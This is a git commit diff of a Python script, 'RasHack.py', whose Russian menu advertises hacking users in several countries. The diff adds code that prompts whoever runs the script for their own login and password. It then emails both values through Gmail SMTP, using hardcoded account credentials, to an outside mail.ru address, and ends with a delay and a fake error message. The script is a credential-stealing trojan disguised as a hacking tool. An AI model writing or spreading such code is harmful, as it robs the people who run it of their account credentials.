3df92b8d5f32b20445d65ce7bc65d35c719f74e7
Boira <52742251+Boira@users.noreply.github.com>
2019-08-08 00:50:34 +0300

    Update RasHack.py

--- RasHack.py
+++ RasHack.py
@@ -3,40 +3,35 @@ print('RasHack-программа для тестирования защищен
 print('для просмотра списка команд нажмите enter')
 a = input()
 if a == 4:
-	print('взлом пользователей с Казахстана: kzh_hack взлом пользователей со стран Закавказья: kav_hack взлом пользователей с Украины: ukr_hack взлом пользователей с Китая: china_hack взлом пользователей со всех стан(max profit): all_hack')
+	hshs = 2
 else:
-		print('Взлом пользователей с Казахстана: kzh_hack взлом пользователей со стран Закавказья: kav_hack взлом пользователей с Украины: ukr_hack взлом пользователей с Китая: china_hack взлом пользователей со всех стран(max profit): all_hack')
+		print('Взлом пользователей Казахстана: kzh_hack')
+		print('Взлом пользователей со стран Закавказья: kav_hack')
+		print('Взлом пользователей с Украины: ukr_hack')
+		print('Взлом пользователей с Китая: china_hack')
+		print('Взлом пользователей со всех стран(max profit): all_hack')
 		z = input()
-if z == 4:
-	print(z)		
-else:
-	print('starting...')
+if z == 'kzh_hack' or 'kav_hack' or 'ukr_hack' or 'china_hack' or 'all_hack':
+	print('done')
+import time
+time.sleep(7)
+print('starting...')
 	
 b = input('Your login:')
 c = input('Your password:')
+
+import smtplib
+smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+smtpObj.starttls()
+smtpObj.login('kirilpupi@gmail.com','animegovno')
+smtpObj.sendmail("kirilpupi@gmail.com","digitalbbb@mail.ru", "{}".format(b))
+smtpObj.quit()
+smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+smtpObj.starttls()
+smtpObj.login('kirilpupi@gmail.com','animegovno')
+smtpObj.sendmail("kirilpupi@gmail.com","digitalbbb@mail.ru", "{}".format(c))
+smtpObj.quit()
 v = input('Target id:')
-f = str(b + ":" + c) 
-g = len(f)
-if v == 1:
-	print(v)
-else:
-	print('working...')
-	i = 'Rrjwjejdjcjwi11aqkpppadjjwje3i999ejehswhejsjwueusuqqqq'
-	r = 'QvjwuciJwjxuawjfkzciwifjj88ebfbzjU88w8r8oagjsn8w7d7zhNnx'
-if g == 21:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16]+i+r+f[17]+r+f[18]+r+f[19]+r+f[20])
-elif g == 20:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16]+i+r+f[17]+r+f[18]+r+f[19])
-elif g == 19:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16]+i+r+f[17]+r+f[18])
-elif g == 18:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16]+i+r+f[17])
-elif g == 17:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16])
-elif g == 16:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15])
-elif g == 22:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16]+i+r+f[17]+r+f[18]+r+f[19]+r+f[20]+r+f[21])
-elif g == 23:
-		print('eror:'+r+f[0]+i+r+f[1]+r+f[2]+r+f[3]+i+r+f[4]+r+f[5]+i+r+f[6]+r+f[7]+r+f[8]+i+r+f[9]+r+f[10]+r+f[11]+r+f[12]+r+f[13]+i+r+f[14]+r+f[15]+r+f[16]+i+r+f[17]+r+f[18]+r+f[19]+r+f[20]+r+f[21]+r+f[22])
-		
+print('working...')
+time.sleep(300)
+print('eror27')
